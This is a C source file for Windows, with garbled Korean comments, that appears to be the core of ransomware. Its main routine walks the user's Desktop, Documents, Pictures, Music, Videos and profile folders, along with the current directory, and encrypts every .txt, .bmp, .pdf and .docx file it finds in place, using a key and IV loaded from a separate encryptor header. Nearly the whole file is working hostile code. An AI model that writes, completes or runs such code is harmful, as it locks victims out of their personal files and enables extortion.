#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>
#include "encryptor.h"  // �ݵ�� �Բ� ������

// ��ȣȭ ��� Ȯ���� ����Ʈ
const char* extList[] = {
    ".txt", ".bmp", ".pdf", ".docx"
};

// Ȯ���� ����
int is_target_file(const char* filename) {
    const char* ext = strrchr(filename, '.');
    if (!ext) return 0;
    for (int i = 0; i < sizeof(extList) / sizeof(extList[0]); i++) {
        if (_stricmp(ext, extList[i]) == 0) return 1;
    }
    return 0;
}

// ���丮 Ž�� �� ��ȣȭ ����
void scan_directory(const char* dir, const unsigned char* key, const unsigned char* iv) {
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, MAX_PATH, "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_directory(fullpath, key, iv);
        }
        else {
            if (is_target_file(fd.cFileName)) {
                printf("[��ȣȭ ���] %s\n", fullpath);
                encrypt_file(fullpath, key, iv);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

// main: ����� �ֿ� ���� + ���� ���� ��ȣȭ ����
int main() {
    unsigned char key[32];
    unsigned char iv[16];
    restore_key(key);
    restore_iv(iv);

    const int target_folders[] = {
        CSIDL_DESKTOP,
        CSIDL_PERSONAL,
        CSIDL_MYPICTURES,
        CSIDL_MYMUSIC,
        CSIDL_MYVIDEO,
        CSIDL_PROFILE
    };

    char path[MAX_PATH];
    for (int i = 0; i < sizeof(target_folders) / sizeof(target_folders[0]); i++) {
        if (SHGetFolderPathA(NULL, target_folders[i], NULL, 0, path) == S_OK) {
            printf("[MAIN] Ž�� ����: %s\n", path);
            scan_directory(path, key, iv);
        }
    }

    // ���� ���� ������ Ž��
    GetCurrentDirectoryA(MAX_PATH, path);
    printf("[MAIN] ���� ���� Ž�� �߰�: %s\n", path);
    scan_directory(path, key, iv);

    return 0;
}
